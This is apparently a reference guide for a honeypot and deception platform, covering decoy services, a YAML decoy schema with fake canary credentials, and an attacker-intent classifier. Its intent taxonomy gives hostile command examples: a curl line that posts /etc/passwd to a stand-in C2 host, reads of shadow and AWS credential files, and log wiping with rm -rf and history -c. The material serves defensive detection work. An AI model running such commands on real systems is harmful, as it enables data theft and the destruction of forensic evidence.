# BEELZEBUB-GRADE CYBER DECEPTION PLATFORM & REAL-TIME ATTACKER PROFILING
## Enterprise Reference & Architecture Guide (docs.beelzebub.ai Reference Architecture)

---

### 1. Platform Philosophy: The Assumed Breach Paradigm

Traditional cyber defense relies on perimeter boundaries that inevitably fail against credential theft, zero-days, or internal compromise. **INTENT-AWARE** implements the **Assumed Breach** philosophy modeled after **Beelzebub Cloud**:

1. **Active Trap Surface**: Instead of waiting for security alerts from firewalls, the infrastructure is densely populated with low-interaction, realistic decoy services across **SSH, HTTP, TCP (Redis), Telnet (IoT), and Model Context Protocol (MCP)**.
2. **Zero False Positives**: Legitimate users and applications never have a reason to connect to decoy ports or touch canary credentials (`AKIA...` keys, synthetic `/etc/shadow` bcrypt hashes, or canary IBANs). Any interaction represents confirmed adversary activity.
3. **Mathematically Enforced Zero Host Execution**: Attacker commands are **never** executed on the underlying host or container operating system. Feedback is synthesized through deterministic regex engines, virtual filesystems, and low-interaction LLM wrappers.
4. **Autonomous Threat Investigation**: Modeled after Beelzebub's flagship AI Analyst **Caronte**, the system autonomously correlates session commands, maps techniques to the **MITRE ATT&CK Matrix**, and generates executive forensic dossiers.

---

### 2. Supported Decoy Fleet & Protocols

| Decoy Service | Port | Target Architecture | Engine / Protocol | Deployed Honeytokens |
| :--- | :--- | :--- | :--- | :--- |
| **Linux Enterprise Host** | `2222` | Debian GNU/Linux 12 | Cowrie / Beelzebub SSH (SSH-2.0-OpenSSH_8.9p1) | Bcrypt `/etc/shadow`, AWS IAM access keys |
| **Microservices Cloud API** | `8080` | Spring Boot / FastAPI | Beelzebub HTTP (`/actuator/env`, `/swagger`) | Canary JWT, Database Vault tokens |
| **Enterprise Cache** | `6379` | Redis Cluster | Beelzebub TCP (RESP Protocol) | Synthetic session keys, admin tokens |
| **Model Context Protocol (MCP)**| `9090` | AI Agent Tool Runtime | Beelzebub MCP Guardrail Trapper | `execute_bash` tripwires, canary RAG seeds |
| **Edge Gateway / IoT Router** | `2323` | Broadcom MIPS-32 | Beelzebub Telnet (BusyBox v1.33.1) | Mirai botnet shell traps |

---

### 3. Low-Code Decoy Specification (Beelzebub YAML Schema)

Services are declared through declarative YAML configuration files:

```yaml
apiVersion: "v1"
protocol: "ssh"
address: ":2222"
description: "Production Linux Bastion Decoy"
serverVersion: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
banner: "Debian GNU/Linux 12 (bookworm) - Authorized Access Only"

commands:
  - regex: "^(whoami|id)$"
    handler: "terminal"
    output: "uid=0(root) gid=0(root) groups=0(root)"
  - regex: "^cat /etc/passwd"
    handler: "terminal"
    output: "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash"

tarpit:
  enabled: true
  delayMs: 350

honeytokens:
  - type: "SHADOW_HASH"
    path: "/etc/shadow"
    value: "$2a$12$e8pCanaryRootHashBcryptDeterministicFake2026"
  - type: "AWS_CREDENTIAL"
    path: "/root/.aws/credentials"
    value: "aws_access_key_id=AKIAIOSFODNN7EXAMPLE"
```

---

### 4. Attacker Profiling: 10-Class Intent AI & Markov Transitions

#### A. 10-Class Intent Classification Pipeline
Commands are categorized in real-time by a calibrated Linear Support Vector Classifier:
1. `RECONNAISSANCE` (e.g., `uname -a`, `whoami`, `id`)
2. `DISCOVERY` (e.g., `netstat -tuln`, `find / -name "*.bak"`)
3. `CREDENTIAL_ACCESS` (e.g., `cat /etc/shadow`, `cat ~/.aws/credentials`)
4. `EXECUTION` (e.g., `python -c "..."`, `./exploit.sh`)
5. `PRIVILEGE_ESCALATION` (e.g., `sudo -l`, `pkexec`)
6. `PERSISTENCE` (e.g., `crontab -e`, `echo "..." >> ~/.bashrc`)
7. `EXPLOITATION` (e.g., Log4Shell JNDI injection, regreSSHion SIGALRM race)
8. `EXFILTRATION` (e.g., `curl -X POST -d @/etc/passwd http://c2.xyz`)
9. `CLEANUP` (e.g., `rm -rf /var/log/*`, `history -c`)
10. `OTHER` (Unrecognized utility commands)

**Production Model Performance:**
- **Accuracy:** `94.49%`
- **Macro F1:** `0.9229`
- **Weighted F1:** `0.9450`

#### B. Markov Sequence Transition Engine
Calculates transition likelihoods $P(\text{Intent}_t \mid \text{Intent}_{t-1})$:
- Anomaly scores increase when attackers execute abnormal intent jumps (e.g. `RECONNAISSANCE` $\rightarrow$ `EXFILTRATION`).
- Automatically projects the attacker's next likely intent to pre-stage adaptive deception responses.

---

### 5. Caronte AI Threat Investigation Engine

Modeled after **Caronte** in Beelzebub Platform:
1. **Attack Path Reconstruction**: Reconstructs disjoint commands into chronological attack chains.
2. **MITRE ATT&CK Matrix Alignment**: Automatically maps commands to MITRE techniques (`T1059.004`, `T1082`, `T1003.008`, `T1105`, `T1552.001`).
3. **IOC Extraction**: Extracts malicious IP addresses, C2 download URLs, and target file paths.
4. **Attacker Sophistication Rating**:
   - `AUTOMATED_BOTNET`: High-velocity tool transfers with no manual interactive exploration.
   - `INTERMEDIATE_SCANNER`: Standard reconnaissance utility usage.
   - `ADVANCED_PERSISTENT_THREAT (APT)`: Living-off-the-land techniques, obfuscation, and canary evasion.
5. **Containment Metrics**: Calculates containment score and cumulative tar-pit delay imposed.

---

### 6. Research Laboratories (Extensions)

1. **Financial Services Security Laboratory (`/financial`)**:
   - High-value canary accounts (Corporate Treasury, Escrow, Payroll).
   - Real-time wire transfer fraud rule validation.
2. **AI Services & Agent Security Laboratory (`/ai-security`)**:
   - Prompt injection and jailbreak detector.
   - Model Context Protocol (MCP) tool call validation.
   - RAG canary document leak traps.
3. **Industrial ICS Robustness Laboratory (`/research` Tab 3)**:
   - SWaT water treatment plant physical invariants (`FIT101`, `LIT101`, etc.).
   - $\ell_\infty$ bounded adversarial sensor spoofing perturbation tests.
4. **Vulnerability Verification Laboratory (`/research` Tab 4)**:
   - Curated CVE benchmarks (Log4Shell, regreSSHion, Spring4Shell, Redis sandbox escape, Shellshock).
   - Safe in-memory exploit sandbox.
5. **Model Registry & Drift Monitoring (`/research` Tab 5)**:
   - SHA-256 artifact verification and Population Stability Index (PSI) drift monitoring.

---

### 7. Deployment & Verification

```bash
# 1. Start full Docker stack
docker compose up -d --build

# 2. Access Web Platform
# Dashboard:       http://localhost:5173
# Cyber Deception: http://localhost:5173/deception
# Documentation:   http://localhost:5173/documentation
# Research Labs:   http://localhost:5173/research
# REST OpenAPI:    http://localhost:8000/docs
```
